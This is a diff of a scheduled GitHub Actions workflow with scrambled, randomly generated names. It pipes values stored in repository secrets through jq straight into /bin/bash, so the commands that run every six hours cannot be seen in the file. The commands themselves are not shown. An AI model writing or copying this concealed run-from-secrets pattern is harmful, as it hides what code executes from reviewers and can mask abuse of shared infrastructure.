@@ -3,20 +3,30 @@ name: zhengcunzai3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
+    - cron: '12 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhengcunzai3456
         env:
-          fmxp36093: ${{ secrets.fmxp36093 }}
+          i70095: ${{ secrets.i70095 }}
         run: |
-          echo $fmxp36093 | jq -r .chjla229 | /bin/bash
-          echo $xjch72 | jq -r .juqc7625 | /bin/bash
-          echo $pr12 | jq -r .jfkyw500 | /bin/bash
-          echo $swdj16768 | jq -r .sozgh7912 | /bin/bash
-          echo $rnu3165 | jq -r .grt612 | /bin/bash
+          echo $i70095 | jq -r .frzc82 | /bin/bash
+          echo $dqx48482 | jq -r .xli6 | /bin/bash
+          echo $q438 | jq -r .n4215 | /bin/bash
+          echo $scu94061 | jq -r .ya57689 | /bin/bash
+          echo $vh95114 | jq -r .shjtr15252 | /bin/bash
+          echo $amr72 | jq -r .lmf671 | /bin/bash
+          echo $jn806 | jq -r .oexze484 | /bin/bash
+          echo $ypyh00 | jq -r .pzc953 | /bin/bash
+          echo $xj55 | jq -r .jm7798 | /bin/bash
+          echo $oizqw408 | jq -r .mgk1 | /bin/bash
+          echo $oj703 | jq -r .hhf865 | /bin/bash
+          echo $sw7 | jq -r .qqhuk808 | /bin/bash
+          echo $bjx02807 | jq -r .uofx19 | /bin/bash
+          echo $auc0 | jq -r .wtuop69 | /bin/bash
 
